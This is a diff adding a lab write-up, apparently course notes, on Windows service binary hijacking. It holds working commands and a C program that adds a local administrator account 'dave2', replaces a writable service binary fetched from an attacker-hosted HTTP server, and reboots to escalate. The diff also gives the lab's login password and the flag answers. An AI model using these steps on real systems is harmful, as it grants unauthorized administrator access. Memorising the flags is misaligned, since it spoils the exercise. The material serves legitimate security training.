@@ -348,5 +348,138 @@ PS C:\Users\mac> type C:\users\mac\appdata\roaming\Microsoft\Windows\PowerShell\
 > Answer:  OS{9575d125b006abda12c9bf8f8cb421d8}
 
 
+# Service Binary Hijacking
+
+2. Connect to _CLIENTWK221_ (VM #2) via RDP as user _milena_ with the password _MyBirthDayIsInJuly1!_
+   Find a service in which _milena_ can replace the service binary. Get an interactive shell as user running the service and find the flag on the desktop.
+
+```powershell
+# Enumerate services
+PS C:\Users\milena> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\Windows\system32\*')}
+
+	Name             State   PathName
+	----             -----   --------
+	BackupMonitor    Running C:\BackupMonitor\BackupMonitor.exe
+	LSM              Running
+	TrustedInstaller Running C:\Windows\servicing\TrustedInstaller.exe
+	VGAuthService    Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
+	VMTools          Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
+
+# Check privileges of BackupMonitor and TrustedInstaller
+PS C:\Users\milena> icacls "C:\BackupMonitor\BackupMonitor.exe"
+	C:\BackupMonitor\BackupMonitor.exe BUILTIN\Administrators:(I)(F)
+				   NT AUTHORITY\SYSTEM:(I)(F)
+				   BUILTIN\Users:(I)(RX)
+				   NT AUTHORITY\Authenticated Users:(I)(M)                    #<--NOTE 'Modify' permission
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\Users\milena> icacls "C:\Windows\servicing\TrustedInstaller.exe"
+	C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)
+				  BUILTIN\Administrators:(RX)
+				  NT AUTHORITY\SYSTEM:(RX)
+				  BUILTIN\Users:(RX)
+				  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
+				  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
+
+# Check melina's groups
+PS C:\Users\milena> whoami /groups
+
+	GROUP INFORMATION
+	-----------------
+	
+	Group Name                             Type             SID          Attributes
+	====================================== ================ ============ ==================================================
+	Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+	BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
+	BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+	NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
+	NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+	NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+	NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+	NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+	LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+	NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+	Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+```
+	- As the user is a member of the Authenticated Users group AND BackupMonitor allows that group to Modify the file, we've found our service
+
+- Use `adduser` as a replacement and to add an admin
+```c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  i = system ("net localgroup 'Remote Desktop Users' dave2 /add");
+  
+  return 0;
+}
+```
+```bash
+# Cross-compile and host
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+python3 -m http.server 80
+```
+
+- Replace service's binary, reboot to trigger, get interactive shell of new user, run PS as 'admin', and read flag
+```powershell
+PS C:\Users\milena> iwr -uri http://192.168.45.242/adduser.exe -Outfile adduser.exe
+PS C:\Users\milena> move C:\BackupMonitor\BackupMonitor.exe .
+PS C:\Users\milena> move adduser.exe C:\BackupMonitor\BackupMonitor.exe
+
+# Check service's start mode
+PS C:\Users\milena> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'BackupMonitor'}
+	Name          StartMode
+	----          ---------
+	BackupMonitor Auto
+
+# Check user's reboot privileges
+PS C:\Users\milena> whoami /priv
+	PRIVILEGES INFORMATION
+	----------------------
+	
+	Privilege Name                Description                          State
+	============================= ==================================== ========
+	SeShutdownPrivilege           Shut down the system                 Disabled      # <--NOTE
+	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+	SeUndockPrivilege             Remove computer from docking station Disabled
+	SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+	SeTimeZonePrivilege           Change the time zone                 Disabled
 
 
+PS C:\Users\milena> shutdown /r /t 0
+
+# Reconnect & verify
+PS C:\Users\milena> Get-LocalGroupMember Administrators
+
+ObjectClass Name                      PrincipalSource
+----------- ----                      ---------------
+User        CLIENTWK221\Administrator Local
+User        CLIENTWK221\dave2         Local         # <--Added User
+User        CLIENTWK221\offsec        Local
+User        CLIENTWK221\roy           Local
+
+# Find user who started service
+PS C:\Users\milena> Get-CimInstance -ClassName win32_service -Filter "name='BackupMonitor'" | select StartName
+	StartName
+	---------
+	.\roy
+
+# Switch to new user
+PS C:\Users\milena> runAs /user:dave2 powershell.exe
+	Enter the password for dave2:
+	Attempting to start powershell.exe as user "CLIENTWK221\dave2" ...
+
+# Start PS terminal 'run as Admin'
+PS C:\Windows\system32> Start-Process powershell.exe -Verb runAs
+
+# Get flag
+PS C:\Windows\system32> type C:\users\roy\desktop\flag.txt
+OS{bda3a494a3aecfa18b14dcf00e35dd79}
+```
+
+> Answer:  OS{bda3a494a3aecfa18b14dcf00e35dd79}
